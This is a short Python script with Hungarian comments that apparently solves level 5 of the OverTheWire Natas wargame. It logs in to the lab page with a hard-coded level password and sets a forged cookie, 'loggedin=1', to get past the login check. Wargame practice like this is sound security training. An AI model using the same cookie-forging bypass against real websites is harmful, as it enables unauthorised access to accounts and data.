from urllib import response
#3.9 pythonnal megy!!

import requests
import re

username = 'natas5'
password = 'Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD'

#headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}

cookie_ = {"loggedin" : "1"}

url = 'http://%s.natas.labs.overthewire.org/' % username
session = requests.Session()
#print(session)

#reponse = requests.get(url, auth=(username, password), headers=headers)
#reponse = requests.get(url, auth=(username, password))

#a sessionhoz hozárendelt get kérés
reponse = session.get(url, auth=(username, password), cookies=cookie_)
content = reponse.text

#indexelni is lehet
print(session.cookies['loggedin'])

#keresés a tartalomban. A (.*) a helyettesítő karakter. ami itt van az eredetiban azt figyelman kívül fogja hagyni.
#print(re.findall('natas3:(.*)' ,content))

print(content)